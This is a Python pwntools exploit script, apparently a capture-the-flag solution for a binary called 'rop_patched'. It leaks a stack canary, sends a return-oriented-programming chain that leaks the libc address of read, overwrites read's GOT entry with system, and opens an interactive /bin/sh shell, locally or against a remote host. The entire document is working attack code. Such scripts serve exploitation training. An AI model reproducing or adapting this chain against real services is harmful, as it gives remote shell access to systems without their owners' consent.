#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('rop_patched')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+235
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    
    offset = 0x38
    buf = b'A'*(offset+1)
    io.sendafter(b'Buf: ', buf)
    io.recvuntil(buf)
    canary = u64(b'\x00' + io.recvn(7))
    info("canary: %#x", canary)

    pop_rdi = 0x400853 # pop rdi; ret;
    pop_rsi_r15 = 0x400851 # pop rsi; pop r15; ret;
    ret = 0x400596 # ret;

    payload = flat({
        offset: [
            canary,
            b'B'*8,
            # write(1, read_got, edx)
            pop_rdi,
            0x1,
            pop_rsi_r15,
            exe.got['read'],
            0x0,
            exe.plt['write'],
            # read(0, read_got, edx)
            pop_rdi,
            0x0,
            pop_rsi_r15,
            exe.got['read'],
            0x0,
            exe.plt['read'],
            # now got of read should be system so -> read("/bin/sh") == system("/bin/sh")
            pop_rdi,
            exe.got['read']+8,
            ret,
            exe.plt['read']
        ]
    })

    io.sendafter(b'Buf: ', payload)
    read = u64(io.recvn(6) + b'\x00'*2)
    libc_base = read - libc.sym['read']
    system = libc_base + libc.sym['system']
    info("read: %#x", read)
    info("libc base: %#x", libc_base)
    info("system: %#x", system)

    io.clean()

    got_overwrite = p64(system) + b'/bin/sh\x00'
    io.send(got_overwrite)

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

